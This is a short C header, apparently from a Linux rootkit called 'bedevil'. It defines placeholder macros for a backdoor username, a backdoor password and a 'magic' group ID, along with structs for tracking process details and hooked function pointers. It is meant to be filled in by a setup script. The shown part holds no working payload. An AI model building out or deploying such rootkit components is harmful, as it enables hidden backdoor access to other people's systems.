/*
* YOU NEED NOT TOUCH ANYTHING IN THIS FILE.
* MAY BEDEVIL.SH DO THE WORK.
*/

#ifndef BEDEVIL_H
#define BEDEVIL_H

#define BD_UNAME "??BD_UNAME??"
#define BD_PWD "??BD_PWD??"
#define MAGIC_GID ??MAGIC_GID??

static struct pi {
    char myname[512];
    char mycmdline[512];
    pid_t mypid;
    uid_t myuid;
    uid_t myeuid;
    gid_t mygid;
} process_info;

typedef struct symbol_struct {
    void *(*func)();
} syms;

